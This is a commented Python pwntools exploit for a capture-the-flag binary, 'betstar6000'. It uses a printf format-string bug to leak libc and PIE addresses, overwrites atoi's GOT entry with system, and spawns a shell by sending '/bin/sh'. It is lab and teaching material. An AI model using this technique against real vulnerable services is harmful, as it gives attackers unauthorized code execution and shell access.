import pwn
import struct

# betstar6000 is a 32-bit dynamically linked stripped binary
# There is a canary, NX is on, PIE is on, ASLR is enabled

# This is a better version of the original wateverctf19_betstar challenge,
# it does not have libc version dependencies, and lets you get a real shell

# We are able to use a printf format string vulnerability to first leak a instruction address and a libc pie address
# using those, we calculate libc base, and pie base
# Then, using some magic, we are able to overwrite the got address of atoi, with the libc address of system
# This allows us to send /bin/sh as our menu selection, and we get a shell

# Hints for debugging stripped PIE binaries
# Run vmmap in gdb once the binary has started
# Then get the base address of the executable portion of memory to find the pie base addr
# Add your offsets to this to set breakpoints
# Make sure ghidra base address is 0x0 before searching for offsets!
# I havn't found a way to do breakpoints within pwn effectively
# Just add them once you are in GDB

# PIE offset of vulnerable printf call is 0xcdd

target_elf = pwn.ELF('betstar6000')
libc_elf = pwn.ELF('libc-2.27.so') # libc version pulled off of the i386/ubuntu:18.04 docker container
ld_elf = pwn.ELF('ld-2.27.so')

# This is how you can run the exploit locally and test with a specified version of libc
# Note: The message: ERROR: ld.so: object ... from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
# is not an error, it is a warning, and you can just ignore it
target = pwn.process([ld_elf.path, target_elf.path], env={"LD_PRELOAD": libc_elf.path})

# For sending remotely:
# This does not actually work remotely, I do not know why
# target = pwn.remote("127.0.0.1", 1024)


# bps must be manually set because of PIE. vulnerable printf is at offset, 0xcdd, instruction right after at 0xce2
# 0xb98 is the pie offset where the target atoi is called
# pwn.gdb.attach(target)

PLAY = b'1'
ADD = b'2'
EDIT = b'3'
EXIT = b'4'

##############################
#### 1) Leaking Addresses ####
##############################

target.sendline(b'1') # 1 player

# break at pie base + 0xcdd to see
# The top of the stack at the time of the vulnerable printf call is:
# [ pointer to %x.%x ]
# [ the value 0x000005]
# [ pointer to libc _IO_2_1_stdin_ ]
# [ pointer to this mov DWORD instruction -- ending in 0xbe1 ]

# run a couple of times to verify that the stack looks like that everytime and that the ptr always ends in 0xbe1
# Then, on a given run, take that address and subtract the vmmap base: 0x5658ebe1 - 0x5658e000 to confirm the offset
# its 0xbe1


# From the local version, we were able to find
# The libc stdin ptr with a fixed offset:
# We can search for that same name in the remote binaries version of libc:
# readelf -s libc-2.27.so | grep grep _IO_2_1_stdin_
# to confirm it is also there.

target.sendline(b'%2$x.%3$x')
target.sendline(PLAY) # play a round
target.sendline(b'1') # 1 player
target.sendline(b'20') # bet 

target.recvuntil(b'the winner is: ')
leak = target.recvline().strip(b'\n')
leak_list = leak.split(b'.')

libc_stdin = int(leak_list[0], 16)
pie_ptr = int(leak_list[1], 16)

print(f"pie leak: {hex(pie_ptr)} libc leak: {hex(libc_stdin)}")

libc_pie_base = libc_stdin - libc_elf.symbols['_IO_2_1_stdin_']
pie_base = pie_ptr - 0xbe1

print(f"pie base: {hex(pie_base)} libc pie base: {hex(libc_pie_base)}") # both should end in 000


#############################
#### Building fmt String ####
#############################

# breaking at the printf call and examining the stack with telescope -l 30 $esp
# we can see that the name which is about to be printed is stored in a buffer
# at $esp + 0x3c (60 decimal)
# 60/4 = 15, so we should expect to see the start of our input at the 15st value

# We can verify this by creating a player aaaabbbb%15$x.%16$x and having them win a round

libc_elf.address = libc_pie_base # set the base address of the libc elf
target_elf.address = pie_base # set the base address of the target elf

libc_system = libc_elf.symbols['system']
atoi_got = target_elf.got['atoi']

print(f"atoi_got: {hex(atoi_got)} libc_system: {hex(libc_system)}")

system_low_order = (libc_system & 0x0000ffff) - 8
system_high_order = ((libc_system & 0xffff0000) >> 16) - (libc_system & 0x0000ffff)

fmt_string = struct.pack("<I", atoi_got)
fmt_string += struct.pack("<I", atoi_got + 2)
fmt_string += b'%' + str(system_low_order).encode() + b'x'
fmt_string += b'%15$n'
fmt_string += b'%' + str(system_high_order).encode() + b'x'
fmt_string += b'%16$n'

if len(fmt_string) > 48: # max name length is 48
    print(f"format string is too long: {len(fmt_string)}")
    exit()

############################
#### Writing fmt String ####
############################

target.sendline(ADD) # Add a player
target.sendline(fmt_string)

# play a round and execute the vulnerable printf
target.sendline(PLAY)
target.sendline(b'2')
target.sendline(b'999') # player 1's bet (intentionally bad)
target.sendline(b'50') # player 2's bet

target.sendline(PLAY)
target.sendline(b'/bin/sh\x00') # number of players user in will be atoi'd, that is what we are sending

target.interactive()




